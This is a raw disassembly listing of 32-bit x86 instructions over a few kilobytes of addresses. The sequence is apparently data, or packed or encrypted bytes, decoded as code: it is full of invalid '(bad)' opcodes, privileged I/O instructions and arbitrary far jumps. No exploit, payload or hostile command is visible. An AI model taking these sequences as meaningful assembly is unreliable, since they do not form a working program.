  41f590:	fnsave [esp+edi*2-0x22fc3b3b]
  41f597:	and    BYTE PTR [eax+0x480dc6cd],al
  41f59d:	ret    0xbeba
  41f5a0:	outs   dx,DWORD PTR ds:[esi]
  41f5a1:	mov    cl,0x40
  41f5a3:	mov    bh,0x88
  41f5a5:	cli    
  41f5a6:	loopne 0x41f5b1
  41f5a8:	ss stc 
  41f5aa:	xchg   esi,eax
  41f5ab:	icebp  
  41f5ac:	jne    0x41f59b
  41f5ae:	js     0x41f61b
  41f5b0:	outs   dx,DWORD PTR ds:[esi]
  41f5b1:	in     al,dx
  41f5b2:	and    dh,ch
  41f5b4:	mov    esi,0x4a3cabc8
  41f5b9:	push   eax
  41f5ba:	mov    DWORD PTR [ecx],ecx
  41f5bc:	or     BYTE PTR [edx+0x68],0x7d
  41f5c0:	retf   0x43ea
  41f5c3:	cmp    BYTE PTR [edi+0x30],bl
  41f5c6:	mov    ch,0xe1
  41f5c8:	scas   eax,DWORD PTR es:[edi]
  41f5c9:	(bad)  
  41f5ca:	sub    ebx,edi
  41f5cc:	or     eax,DWORD PTR [ecx]
  41f5ce:	mov    cl,0xbd
  41f5d0:	xor    ecx,ebx
  41f5d2:	dec    edi
  41f5d3:	xor    al,0x72
  41f5d5:	cmp    al,0x81
  41f5d7:	jbe    0x41f5ce
  41f5d9:	or     ah,BYTE PTR [ecx]
  41f5db:	xor    DWORD PTR [ebx-0x54],ebx
  41f5de:	sar    DWORD PTR [eax-0x6cc16948],1
  41f5e4:	xor    edx,0x46
  41f5e7:	cmp    eax,0x87c7a84a
  41f5ec:	hlt    
  41f5ed:	aam    0x4b
  41f5ef:	or     DWORD PTR [eax+0x66],edi
  41f5f2:	sahf   
  41f5f3:	test   al,0xac
  41f5f5:	pop    eax
  41f5f6:	push   esi
  41f5f7:	mul    DWORD PTR [esi-0x24]
  41f5fa:	sbb    BYTE PTR [ebx],al
  41f5fc:	retf   
  41f5fd:	and    BYTE PTR [esp+eax*1],bh
  41f600:	imul   BYTE PTR [eax]
  41f602:	rdpmc  
  41f604:	or     DWORD PTR [ecx],edx
  41f606:	imul   eax,edx,0xae7e47f4
  41f60c:	jne    0x41f5fe
  41f60e:	iret   
  41f60f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f610:	inc    edi
  41f611:	xchg   esi,eax
  41f612:	icebp  
  41f613:	retf   0x95e9
  41f616:	(bad)  
  41f617:	sub    al,cl
  41f619:	sbb    DWORD PTR [edi],ebx
  41f61b:	loop   0x41f65d
  41f61d:	gs sub al,0xc1
  41f620:	ficom  DWORD PTR [esp+ebx*8-0x2f5d7818]
  41f627:	retf   0x7425
  41f62a:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41f62c:	or     dl,BYTE PTR [edx]
  41f62e:	gs stos DWORD PTR es:[edi],eax
  41f630:	mul    BYTE PTR [edx-0x29]
  41f633:	inc    BYTE PTR [ecx+eiz*1+0x4968fd9a]
  41f63a:	ja     0x41f61b
  41f63c:	scas   al,BYTE PTR es:[edi]
  41f63d:	pusha  
  41f63e:	adc    BYTE PTR ds:0xa787ee48,al
  41f644:	dec    ebp
  41f645:	jo     0x41f63f
  41f647:	out    dx,eax
  41f648:	mov    edi,0xdaca6ca
  41f64d:	or     ecx,ebx
  41f64f:	mov    cl,0x47
  41f651:	retf   0xcbfd
  41f654:	rol    BYTE PTR [edx-0xe7893c3],1
  41f65a:	and    esp,eax
  41f65c:	(bad)  
  41f65d:	mov    esi,0x913f7310
  41f662:	mov    ah,0xf3
  41f664:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41f666:	push   ds
  41f667:	xchg   esp,esi
  41f669:	fisttp DWORD PTR [eax-0x4a]
  41f66c:	pop    edx
  41f66d:	shr    DWORD PTR [ebx],1
  41f66f:	cwde   
  41f670:	adc    eax,0xac67a9c5
  41f675:	push   edi
  41f676:	push   edi
  41f677:	mov    eax,ds:0x901fa84f
  41f67c:	xor    bl,BYTE PTR [ebp+0x6a4c237e]
  41f682:	mov    ds:0x988f7197,al
  41f687:	std    
  41f688:	pushf  
  41f689:	ins    BYTE PTR es:[edi],dx
  41f68a:	mov    bl,0xb9
  41f68c:	push   ds
  41f68d:	std    
  41f68e:	push   esp
  41f68f:	mov    dh,0x13
  41f691:	xor    DWORD PTR [ebp-0xa],edi
  41f694:	cmp    al,0x68
  41f696:	mul    BYTE PTR [edx+esi*8]
  41f699:	add    al,BYTE PTR [ebp+eax*4+0xe85e8f4]
  41f6a0:	mov    BYTE PTR [esi],bh
  41f6a2:	push   esi
  41f6a3:	ror    edi,0x32
  41f6a6:	jle    0x41f69a
  41f6a8:	xor    eax,0xf1b225c
  41f6ad:	or     DWORD PTR [eax+0x3de48045],ebx
  41f6b3:	adc    DWORD PTR [edx],eax
  41f6b5:	mov    esi,0x7f1d44e4
  41f6ba:	sar    DWORD PTR [esi+0x407b604a],1
  41f6c0:	cs push es
  41f6c2:	fdivr  st(7),st
  41f6c4:	adc    ebx,DWORD PTR [esi]
  41f6c6:	loopne 0x41f6c9
  41f6c8:	cmp    ah,BYTE PTR [ebx]
  41f6ca:	xchg   esi,eax
  41f6cb:	jmp    0x21540b8e
  41f6d0:	cdq    
  41f6d1:	or     eax,0xd110a0ff
  41f6d6:	xor    ch,BYTE PTR [edi]
  41f6d8:	test   al,0x45
  41f6da:	test   BYTE PTR [edi],0xa6
  41f6dd:	pop    ecx
  41f6de:	pop    edi
  41f6df:	xchg   BYTE PTR [esi-0x42],bl
  41f6e2:	dec    esp
  41f6e3:	push   0x22
  41f6e5:	pop    ebp
  41f6e6:	mov    BYTE PTR [edi+0x5ead4c8b],bl
  41f6ec:	xor    al,0xd2
  41f6ee:	mov    dh,0x37
  41f6f0:	fild   WORD PTR [ebp+0x7e]
  41f6f3:	sar    DWORD PTR [ecx],cl
  41f6f5:	adc    al,0x56
  41f6f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6f8:	daa    
  41f6f9:	pop    ds
  41f6fa:	push   cs
  41f6fb:	xchg   DWORD PTR [esi],ecx
  41f6fd:	mov    ?,WORD PTR [esi+0x5a]
  41f700:	push   cs
  41f701:	stos   DWORD PTR es:[edi],eax
  41f702:	js     0x41f729
  41f704:	mov    bl,0xb7
  41f706:	retf   0xbf91
  41f709:	jg     0x41f730
  41f70b:	push   eax
  41f70c:	fs jmp 0x41f770
  41f70f:	js     0x41f73c
  41f711:	add    BYTE PTR [edi+esi*8-0x6c],ah
  41f715:	jge    0x41f774
  41f717:	dec    eax
  41f718:	push   edx
  41f719:	inc    ecx
  41f71a:	aas    
  41f71b:	sub    BYTE PTR [edx+ecx*1-0xc5ae847],ah
  41f722:	sbb    DWORD PTR [ecx+0x2f],eax
  41f725:	or     eax,0xf69662e9
  41f72a:	cmp    esi,esp
  41f72c:	sub    DWORD PTR [edx-0x38f0b7c4],edi
  41f732:	push   0xeaa5771
  41f737:	out    0x90,al
  41f739:	retf   0xdc2a
  41f73c:	xchg   edx,eax
  41f73d:	retf   
  41f73e:	pop    ss
  41f73f:	or     DWORD PTR ds:0xaf4a7fd9,eax
  41f745:	lock je 0x41f6df
  41f748:	adc    BYTE PTR [esi+0x20dda61c],bl
  41f74e:	xor    edi,esi
  41f750:	jle    0x41f785
  41f752:	dec    eax
  41f753:	iret   
  41f754:	jle    0x41f7d1
  41f756:	push   ss
  41f757:	and    ecx,DWORD PTR [esi-0x1e50c2f3]
  41f75d:	or     eax,0x4d8c50ee
  41f762:	pusha  
  41f763:	inc    edx
  41f764:	mov    al,ds:0x4e22e02c
  41f769:	jbe    0x41f72b
  41f76b:	ret    
  41f76c:	xor    ebp,DWORD PTR [edi]
  41f76e:	imul   DWORD PTR [edi]
  41f770:	loopne 0x41f745
  41f772:	add    dl,BYTE PTR [edx-0x17]
  41f775:	mov    ebx,0x208b45f5
  41f77a:	loopne 0x41f7b3
  41f77c:	mov    ds:0x8891d156,eax
  41f781:	fsub   QWORD PTR [eax]
  41f783:	xchg   DWORD PTR [eax+ebx*1-0x29737f5d],ecx
  41f78a:	cmp    dh,BYTE PTR [esi-0x51]
  41f78d:	jl     0x41f7f1
  41f78f:	mov    ah,0xac
  41f791:	xchg   DWORD PTR [ebx],edi
  41f793:	push   0x79
  41f795:	inc    edi
  41f796:	retf   0x1da2
  41f799:	xor    esp,0xffffff9c
  41f79c:	sti    
  41f79d:	cmovl  eax,DWORD PTR [eax-0x6b]
  41f7a1:	cmp    al,BYTE PTR [ebx]
  41f7a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7a4:	(bad)  [ebx-0x30]
  41f7a7:	mov    ds:0xeaf561d2,eax
  41f7ac:	push   edi
  41f7ad:	jmp    esp
  41f7af:	nop
  41f7b0:	pop    esp
  41f7b1:	mov    dl,0x6f
  41f7b3:	aaa    
  41f7b4:	int    0x2c
  41f7b6:	idiv   cl
  41f7b8:	jecxz  0x41f7e0
  41f7ba:	and    al,0xf5
  41f7bc:	cld    
  41f7bd:	xor    DWORD PTR [ebp+esi*1-0x10],ecx
  41f7c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7c2:	xor    DWORD PTR [ebx],edx
  41f7c4:	mov    al,ds:0xfe7228b
  41f7c9:	cli    
  41f7ca:	dec    ebp
  41f7cb:	lods   al,BYTE PTR ds:[esi]
  41f7cc:	and    al,0x4c
  41f7ce:	sbb    al,0xca
  41f7d0:	add    ebx,DWORD PTR [ebx-0x70]
  41f7d3:	add    ebx,esp
  41f7d5:	enter  0xa2ad,0xd0
  41f7d9:	mov    WORD PTR [eax-0x34],es
  41f7dc:	mov    esp,0xb30fe0dd
  41f7e1:	int3   
  41f7e2:	pop    ebx
  41f7e3:	jae    0x41f84d
  41f7e5:	pop    eax
  41f7e6:	xor    eax,0x3c4fc8e4
  41f7eb:	mov    esp,0x20478e79
  41f7f0:	or     al,0xe7
  41f7f2:	and    DWORD PTR [edx-0x8],ebp
  41f7f5:	sub    BYTE PTR [esi+ecx*1],ch
  41f7f8:	xchg   ecx,eax
  41f7f9:	outs   dx,DWORD PTR ds:[esi]
  41f7fa:	xchg   edx,eax
  41f7fb:	into   
  41f7fc:	jb     0x41f7d2
  41f7fe:	xchg   esi,eax
  41f7ff:	push   ebx
  41f800:	lahf   
  41f801:	pop    esp
  41f802:	jp     0x41f846
  41f804:	ret    0xb6f1
  41f807:	clc    
  41f808:	pushf  
  41f809:	sar    DWORD PTR [edi],1
  41f80b:	or     DWORD PTR [edx],edi
  41f80d:	cli    
  41f80e:	xchg   esp,eax
  41f80f:	bnd call 0x9a92e8c9
  41f815:	clc    
  41f816:	cs mov cl,0xdd
  41f819:	ret    
  41f81a:	bound  ebp,QWORD PTR [esp+edi*2]
  41f81d:	fsub   DWORD PTR [esi]
  41f81f:	adc    al,BYTE PTR [edi+edx*2+0x10]
  41f823:	pop    ebp
  41f824:	mov    ah,BYTE PTR [ebx-0x56102a55]
  41f82a:	shl    bl,1
  41f82c:	jbe    0x41f866
  41f82e:	inc    edi
  41f82f:	nop
  41f830:	xchg   esi,eax
  41f831:	pop    ds
  41f832:	xlat   BYTE PTR ds:[ebx]
  41f833:	adc    eax,0xa213cb5d
  41f838:	mov    esp,DWORD PTR [esi+eiz*8]
  41f83b:	inc    esi
  41f83c:	push   esi
  41f83d:	retf   
  41f83e:	xor    al,BYTE PTR [edx-0x40]
  41f841:	arpl   di,si
  41f843:	out    dx,eax
  41f844:	inc    ecx
  41f845:	pop    edx
  41f846:	or     eax,0x7e6ebaf3
  41f84b:	shl    DWORD PTR [edx+0x56f8672b],cl
  41f851:	or     eax,0xe185c346
  41f856:	dec    ecx
  41f857:	ret    0x3dc8
  41f85a:	loopne 0x41f8da
  41f85c:	fisttp DWORD PTR [ecx]
  41f85e:	aaa    
  41f85f:	dec    edx
  41f860:	sahf   
  41f861:	das    
  41f862:	imul   esp,DWORD PTR [edx+0x4a],0x29
  41f866:	push   ebx
  41f867:	push   eax
  41f868:	xor    al,bh
  41f86a:	push   ss
  41f86b:	xor    DWORD PTR cs:[ebx-0x6abf1845],esp
  41f872:	mov    WORD PTR [edi],gs
  41f874:	xchg   ecx,eax
  41f875:	retf   
  41f876:	iret   
  41f877:	inc    ecx
  41f878:	cmp    al,0x10
  41f87a:	jb     0x41f8cd
  41f87c:	ficomp WORD PTR [edi-0x26]
  41f87f:	jnp    0x41f8ae
  41f881:	mov    dh,bl
  41f883:	mov    BYTE PTR [edx-0x3c43bf08],ah
  41f889:	inc    esp
  41f88a:	xchg   edi,eax
  41f88b:	icebp  
  41f88c:	loopne 0x41f8fd
  41f88e:	lock iret 
  41f890:	push   edi
  41f891:	pop    es
  41f892:	xchg   edi,eax
  41f893:	jle    0x41f8fa
  41f895:	xlat   BYTE PTR fs:[ebx]
  41f897:	sbb    eax,0x6c593ba5
  41f89c:	or     eax,esp
  41f89e:	(bad)  [edi-0x60679131]
  41f8a4:	adc    al,0xf0
  41f8a6:	push   cs
  41f8a7:	dec    ebp
  41f8a8:	jle    0x41f8df
  41f8aa:	dec    edx
  41f8ab:	js     0x41f834
  41f8ad:	out    0x75,al
  41f8af:	iret   
  41f8b0:	shr    BYTE PTR [ebp+0x60],0xcf
  41f8b4:	or     ebx,ebx
  41f8b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8b7:	scas   eax,DWORD PTR es:[edi]
  41f8b8:	imul   ebp,esi,0x4d
  41f8bb:	pop    esp
  41f8bc:	xchg   esi,eax
  41f8bd:	push   eax
  41f8be:	xchg   DWORD PTR [eax-0x27f965a],ebx
  41f8c4:	rol    DWORD PTR [ecx],1
  41f8c6:	(bad)  
  41f8c7:	out    dx,al
  41f8c8:	test   al,0x35
  41f8ca:	jge    0x41f887
  41f8cc:	(bad)  
  41f8cd:	and    edi,DWORD PTR [ecx-0x4e1f37cc]
  41f8d3:	daa    
  41f8d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8d5:	adc    BYTE PTR [edi],0xce
  41f8d8:	ds dec ecx
  41f8da:	jp     0x41f958
  41f8dc:	dec    edi
  41f8dd:	in     eax,dx
  41f8de:	jnp    0x41f8f4
  41f8e0:	xor    ebp,DWORD PTR [ebp+0x3d]
  41f8e3:	cmp    DWORD PTR [edx-0x5],esp
  41f8e6:	xchg   edi,eax
  41f8e7:	popa   
  41f8e8:	pop    ds
  41f8e9:	sub    BYTE PTR [esi+0x52db2c13],ah
  41f8ef:	pop    esi
  41f8f0:	xchg   esp,eax
  41f8f1:	xchg   BYTE PTR [edx-0x12],ah
  41f8f4:	dec    edi
  41f8f5:	mov    ah,0xfd
  41f8f7:	sbb    BYTE PTR fs:[esi],ch
  41f8fa:	enter  0xd892,0x9b
  41f8fe:	sbb    BYTE PTR [ebx-0x60],ah
  41f901:	mov    cs,edi
  41f903:	es (bad) 
  41f905:	adc    esp,DWORD PTR [ecx+0x61d8face]
  41f90b:	push   ebp
  41f90c:	mov    cs,WORD PTR [edx-0x28f6d967]
  41f912:	jnp    0x41f8c3
  41f914:	sahf   
  41f915:	cmp    ch,ch
  41f917:	pop    edi
  41f918:	cmp    edx,DWORD PTR [ecx+0xa]
  41f91b:	jmp    0x3458:0xd3f6d71c
  41f922:	sahf   
  41f923:	or     BYTE PTR [edi-0x5e],0x3e
  41f927:	push   es
  41f928:	jmp    0x644d5049
  41f92d:	mov    edx,0x7817317b
  41f932:	mov    eax,0xa060b1b8
  41f937:	leave  
  41f938:	adc    DWORD PTR [edi],0xffffff8a
  41f93b:	cld    
  41f93c:	fsub   DWORD PTR [ebp-0x44]
  41f93f:	mov    ds:0x13fd5600,eax
  41f944:	xor    BYTE PTR [ecx-0x3151d087],ch
  41f94a:	mov    ebp,0xfc843a07
  41f94f:	in     al,0xef
  41f951:	adc    eax,0xfcdf1f9c
  41f956:	mov    al,ds:0x1652e657
  41f95b:	add    BYTE PTR [esi+edx*8-0x7abe1a62],dh
  41f962:	cmp    eax,0xbddeadfb
  41f967:	fidivr DWORD PTR [edi-0x20]
  41f96a:	loopne 0x41f8ec
  41f96c:	jp     0x41f9be
  41f96e:	in     al,0x2
  41f970:	pusha  
  41f971:	retf   0x6834
  41f974:	dec    esp
  41f975:	cmp    eax,0xe0db3e51
  41f97a:	ins    BYTE PTR es:[edi],dx
  41f97b:	mov    dh,0x31
  41f97d:	cmp    cl,bh
  41f97f:	in     al,dx
  41f980:	inc    BYTE PTR [edi]
  41f982:	or     DWORD PTR [ebx-0x17],esi
  41f985:	cmp    ebp,ecx
  41f987:	repz clc 
  41f989:	adc    DWORD PTR [ebx],edx
  41f98b:	arpl   WORD PTR [edx-0x58aab47c],di
  41f991:	adc    bl,BYTE PTR [esi]
  41f993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f994:	and    DWORD PTR ds:0x75e6804,ebx
  41f99a:	add    BYTE PTR [eax+eiz*4+0x3af65141],ch
  41f9a1:	fwait
  41f9a2:	lea    esi,[ebp+0x2399dbc8]
  41f9a8:	stc    
  41f9a9:	inc    edi
  41f9aa:	popa   
  41f9ab:	pop    ss
  41f9ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9ad:	rcl    dl,0xe
  41f9b0:	xchg   BYTE PTR [ebx],cl
  41f9b2:	xor    BYTE PTR [edi+edi*8],ch
  41f9b5:	mov    dl,0x17
  41f9b7:	mov    edi,edi
  41f9b9:	xor    al,0x48
  41f9bb:	into   
  41f9bc:	dec    esi
  41f9bd:	lods   al,BYTE PTR ds:[esi]
  41f9be:	or     BYTE PTR [ebx-0x3d],ah
  41f9c1:	xchg   ebx,eax
  41f9c2:	jmp    0xf029:0x8f3a211d
  41f9c9:	sbb    al,0x45
  41f9cb:	(bad)  
  41f9cc:	jmp    0x9b10:0xb005fdcc
  41f9d3:	stos   DWORD PTR es:[edi],eax
  41f9d4:	sbb    cl,BYTE PTR [ecx+ecx*4]
  41f9d7:	(bad)  
  41f9d8:	bound  eax,QWORD PTR [edx]
  41f9da:	stos   BYTE PTR es:[edi],al
  41f9db:	mov    es,eax
  41f9dd:	ins    DWORD PTR es:[edi],dx
  41f9de:	jb     0x41fa31
  41f9e0:	sbb    DWORD PTR [ecx],esp
  41f9e2:	icebp  
  41f9e3:	jp     0x41f9a5
  41f9e5:	sbb    eax,0xe6279bf0
  41f9ea:	add    dl,dl
  41f9ec:	jo     0x41fa6c
  41f9ee:	push   cs
  41f9ef:	adc    DWORD PTR [ebx+edx*1-0x6d17f597],esi
  41f9f6:	out    0xee,eax
  41f9f8:	mov    al,ds:0x2a0c2542
  41f9fd:	pop    eax
  41f9fe:	mov    al,0x44
  41fa01:	adc    al,0xbd
  41fa03:	xchg   BYTE PTR [eax],bl
  41fa05:	pop    ds
  41fa06:	xor    DWORD PTR ds:0xf128cc0e,0x4f53ad9d
  41fa10:	pop    esi
  41fa11:	jmp    0x9a13:0x49ab1241
  41fa18:	mov    al,ds:0x75af13f3
  41fa1d:	(bad)  
  41fa1e:	xlat   BYTE PTR ds:[ebx]
  41fa1f:	cmp    edx,edx
  41fa21:	cmp    DWORD PTR [ecx],ebp
  41fa23:	inc    ebx
  41fa24:	cmp    DWORD PTR [eax],ebx
  41fa26:	cli    
  41fa27:	and    esp,DWORD PTR [ebx+0x7e]
  41fa2a:	sub    eax,0xdcc4aa8d
  41fa2f:	vxorps ymm5,ymm3,YMMWORD PTR [edx-0x5]
  41fa34:	adc    BYTE PTR [ecx],bl
  41fa36:	xor    BYTE PTR [edx],dl
  41fa38:	stos   DWORD PTR es:[edi],eax
  41fa39:	ret    0x590a
  41fa3c:	cmp    eax,DWORD PTR [edx]
  41fa3e:	sub    ebx,esp
  41fa40:	or     eax,0xa8983b97
  41fa45:	adc    al,0x8c
  41fa47:	jmp    0x41fa13
  41fa49:	push   ds
  41fa4a:	not    ch
  41fa4c:	mov    ebx,0xeb1cc692
  41fa51:	lahf   
  41fa52:	lock ins DWORD PTR es:[edi],dx
  41fa54:	call   0x845e33c
  41fa59:	sub    esi,DWORD PTR [edx]
  41fa5b:	in     al,dx
  41fa5c:	daa    
  41fa5d:	sar    DWORD PTR [esi-0x54],cl
  41fa60:	adc    eax,0x6874f4c
  41fa65:	pop    es
  41fa66:	sbb    eax,0x70e9601f
  41fa6b:	(bad)  
  41fa6c:	and    ah,al
  41fa6e:	jbe    0x41fa2c
  41fa70:	jo     0x41fa04
  41fa72:	es gs es dec esi
  41fa76:	aaa    
  41fa77:	(bad)  
  41fa78:	cli    
  41fa79:	ret    
  41fa7a:	mov    bl,0xf0
  41fa7c:	adc    eax,0x87dfd877
  41fa81:	sbb    eax,0xc1d7a560
  41fa86:	imul   ecx,DWORD PTR [eax-0x38be6c85],0xec6aa698
  41fa90:	leave  
  41fa91:	jno    0x41fa2d
  41fa93:	les    edi,FWORD PTR [ebx]
  41fa95:	loope  0x41fac9
  41fa97:	or     cl,BYTE PTR [edx]
  41fa99:	sub    ebx,DWORD PTR [ecx]
  41fa9b:	push   ss
  41fa9c:	xor    eax,edi
  41fa9e:	ds mov al,0xd
  41faa1:	cmp    DWORD PTR [edx-0x6732ccbb],esp
  41faa7:	or     eax,0xd2e25ab7
  41faac:	mov    cs,WORD PTR [ecx-0x38]
  41faaf:	xor    cl,ch
  41fab1:	stc    
  41fab2:	cld    
  41fab3:	outs   dx,DWORD PTR ds:[esi]
  41fab4:	push   0xe8c7c044
  41fab9:	test   BYTE PTR [ecx],dl
  41fabb:	dec    esi
  41fabc:	imul   esp,DWORD PTR [ecx],0xafcf414a
  41fac2:	rol    BYTE PTR [ebp-0x773a9823],1
  41fac8:	push   esp
  41fac9:	arpl   WORD PTR [edi],si
  41facb:	push   0x830cc9e6
  41fad0:	add    ebp,ebx
  41fad2:	push   eax
  41fad3:	xor    edx,edi
  41fad5:	or     ebx,DWORD PTR [esi+0x1820ce61]
  41fadb:	dec    ecx
  41fadc:	imul   ebp,DWORD PTR [esi-0x17a64767],0xffffffed
  41fae3:	push   0x90b0f9b2
  41fae8:	ret    0x733c
  41faeb:	cmp    cl,BYTE PTR [edx+0x46]
  41faee:	mov    al,ds:0x87652f7d
  41faf3:	js     0x41fb67
  41faf5:	and    ch,cl
  41faf7:	repz aam 0xa6
  41fafa:	idiv   DWORD PTR ds:0xffa11450
  41fb00:	mov    eax,ds:0x7e11e911
  41fb05:	shl    BYTE PTR [edx+0x77],0x3e
  41fb09:	into   
  41fb0a:	inc    edx
  41fb0b:	sbb    DWORD PTR [edi-0x36e159b3],0xb
  41fb12:	xchg   ebp,eax
  41fb13:	pop    edx
  41fb14:	xchg   DWORD PTR [esi],eax
  41fb16:	mov    cl,cl
  41fb18:	fwait
  41fb19:	int    0x96
  41fb1b:	jp     0x41fb88
  41fb1d:	icebp  
  41fb1e:	pop    edi
  41fb1f:	mov    al,ds:0x37f3c4fa
  41fb24:	jns    0x41fb7a
  41fb26:	ins    BYTE PTR es:[edi],dx
  41fb27:	xchg   edx,eax
  41fb28:	cld    
  41fb29:	pop    es
  41fb2a:	outs   dx,BYTE PTR ds:[esi]
  41fb2b:	imul   eax,DWORD PTR [ecx-0x603d0948],0x77
  41fb32:	jl     0x41fafb
  41fb34:	and    al,0x26
  41fb36:	test   DWORD PTR [eax-0xf2e035a],edi
  41fb3c:	inc    edx
  41fb3d:	dec    ebx
  41fb3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb3f:	stc    
  41fb40:	sbb    eax,0xb41a2fbf
  41fb45:	ror    BYTE PTR [ebx+0x2c],1
  41fb48:	mov    esp,0xb98e8c2
  41fb4d:	push   ds
  41fb4e:	mov    esi,0xd078892f
  41fb53:	adc    bh,BYTE PTR [ecx+eax*4-0xe0fedcd]
  41fb5a:	jecxz  0x41fbbb
  41fb5c:	inc    ecx
  41fb5d:	out    0xc5,al
  41fb5f:	loope  0x41fb82
  41fb61:	jmp    0x1fc4:0xaa4e977e
  41fb68:	inc    ecx
  41fb69:	mov    ecx,edx
  41fb6b:	mov    WORD PTR [ebx],?
  41fb6d:	ret    0x6b32
  41fb70:	jle    0x41fb23
  41fb72:	mov    ecx,ebx
  41fb74:	enter  0x54ed,0xff
  41fb78:	lock push eax
  41fb7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb7b:	jo     0x41fbf2
  41fb7d:	enter  0x13d7,0x3d
  41fb81:	les    eax,FWORD PTR [ebx+ebp*8-0x21]
  41fb85:	div    cl
  41fb87:	cmp    al,0xbe
  41fb89:	push   0xfffffff5
  41fb8b:	and    DWORD PTR [esi],ecx
  41fb8d:	mov    DWORD PTR [ecx+0x4b453437],ebx
  41fb93:	sbb    DWORD PTR [esi+edx*1],ecx
  41fb96:	fld    TBYTE PTR [edi-0x3f]
  41fb99:	cmp    al,0x82
  41fb9b:	or     eax,0xc2b055a7
  41fba0:	add    al,0xab
  41fba2:	ror    BYTE PTR [esi],1
  41fba4:	pop    ss
  41fba5:	out    dx,al
  41fba6:	add    al,0x12
  41fba8:	adc    bh,bh
  41fbaa:	push   es
  41fbab:	xchg   esp,eax
  41fbac:	adc    eax,0xd41ef04b
  41fbb1:	pusha  
  41fbb2:	enter  0x3d6a,0xbf
  41fbb6:	inc    ebp
  41fbb7:	cmp    eax,0x32d0fbcc
  41fbbc:	jbe    0x41fb8b
  41fbbe:	xchg   esp,eax
  41fbbf:	pusha  
  41fbc0:	adc    al,0xe5
  41fbc2:	push   es
  41fbc3:	repnz cmp DWORD PTR [ebx-0xb],ebp
  41fbc7:	pushf  
  41fbc8:	sbb    dh,BYTE PTR [ecx]
  41fbca:	cdq    
  41fbcb:	push   0xffffff84
  41fbcd:	mov    WORD PTR [esi-0x49],cs
  41fbd0:	adc    edi,esp
  41fbd2:	jp     0x41fc19
  41fbd4:	(bad)  
  41fbd5:	(bad)  
  41fbd6:	xor    cl,BYTE PTR [ebx+eiz*2-0x42]
  41fbda:	data16 loopne 0x41fc40
  41fbdd:	icebp  
  41fbde:	shl    BYTE PTR [edx+0x33139849],cl
  41fbe4:	fnstenv [ecx+ebp*1+0x4f42abdc]
  41fbeb:	imul   esp,DWORD PTR cs:[eax+ecx*2-0x1f75b072],0xffffffa8
  41fbf4:	scas   al,BYTE PTR es:[edi]
  41fbf5:	pop    eax
  41fbf6:	fdiv   QWORD PTR [edi-0x7ab5284d]
  41fbfc:	mov    gs,WORD PTR [esi+0x2f3f38c2]
  41fc02:	aas    
  41fc03:	jnp    0x41fbca
  41fc05:	mov    al,ds:0xdcd5e5f2
  41fc0a:	dec    ebp
  41fc0b:	mov    ebx,0x3e8db18e
  41fc10:	pop    ebp
  41fc11:	mov    esp,DWORD PTR ds:0xf1bbc074
  41fc17:	out    0xf5,eax
  41fc19:	mov    WORD PTR [esi],gs
  41fc1b:	aad    0x5e
  41fc1d:	sar    DWORD PTR [eax-0x648a452d],cl
  41fc23:	and    al,0x8d
  41fc25:	or     DWORD PTR [eax],esp
  41fc27:	scas   al,BYTE PTR es:[edi]
  41fc28:	sub    ebx,esp
  41fc2a:	loopne 0x41fbe2
  41fc2c:	std    
  41fc2d:	inc    edi
  41fc2e:	lock neg esi
  41fc31:	push   esi
  41fc32:	std    
  41fc33:	and    al,0xc7
  41fc35:	pop    esp
  41fc36:	push   ds
  41fc37:	imul   eax,DWORD PTR [eax+0x73140609],0xafd30c65
  41fc41:	jle    0x41fbfe
  41fc43:	dec    ebp
  41fc44:	mov    esi,0xc4958c35
  41fc49:	sbb    al,0xd3
  41fc4c:	sbb    bl,BYTE PTR [ebx-0x529eef68]
  41fc52:	enter  0xf919,0x86
  41fc56:	daa    
  41fc57:	push   esp
  41fc58:	and    dl,BYTE PTR [ebx-0x6a937b9b]
  41fc5e:	xchg   ebp,eax
  41fc5f:	pop    ebp
  41fc60:	fs mov ecx,0xeacb55c6
  41fc66:	and    esp,DWORD PTR [eax+0x7fedabe4]
  41fc6c:	push   edi
  41fc6d:	out    0xba,eax
  41fc6f:	pop    edi
  41fc70:	mov    dh,dh
  41fc72:	cdq    
  41fc73:	adc    BYTE PTR [ebx],al
  41fc75:	adc    BYTE PTR cs:[di+0x5f5b],bh
  41fc7b:	jae    0x41fcbf
  41fc7d:	dec    ebx
  41fc7e:	test   DWORD PTR [esp+edi*8],esi
  41fc81:	mov    ds:0xb6ad0c29,al
  41fc86:	add    DWORD PTR [ebx-0x1f38e4fd],0x5f
  41fc8d:	jmp    0x6da18fae
  41fc92:	rcl    ch,1
  41fc94:	fs ret 0x207e
  41fc98:	add    esi,esi
  41fc9a:	jmp    0x27f:0xe92ca560
  41fca1:	sub    al,0xe3
  41fca3:	add    al,0x9
  41fca5:	xor    DWORD PTR ds:0x56c88f3d,0x92bb2093
  41fcaf:	stc    
  41fcb0:	out    dx,al
  41fcb1:	cmp    DWORD PTR [esi],eax
  41fcb3:	dec    ecx
  41fcb4:	mov    dh,dh
  41fcb6:	cdq    
  41fcb7:	loope  0x41fc79
  41fcb9:	das    
  41fcba:	mov    dh,0x44
  41fcbc:	adc    al,0x8a
  41fcbe:	(bad)  
  41fcbf:	sub    eax,0xdc9967c3
  41fcc4:	jmp    0xd397:0x89c0242
  41fccb:	pop    eax
  41fccc:	jbe    0x41fd41
  41fcce:	xchg   DWORD PTR [eax+0x48efde90],ebp
  41fcd4:	cmp    ebp,DWORD PTR [ecx]
  41fcd6:	adc    eax,0xfb2fc782
  41fcdb:	or     BYTE PTR [eiz*8+0x550a5ff4],bh
  41fce2:	iret   
  41fce3:	nop    DWORD PTR [esi+0x71]
  41fce7:	add    BYTE PTR [ebp-0x87e1b7],bh
  41fced:	jno    0x41fc8f
  41fcef:	and    ebx,DWORD PTR [eax-0xc2c6f53]
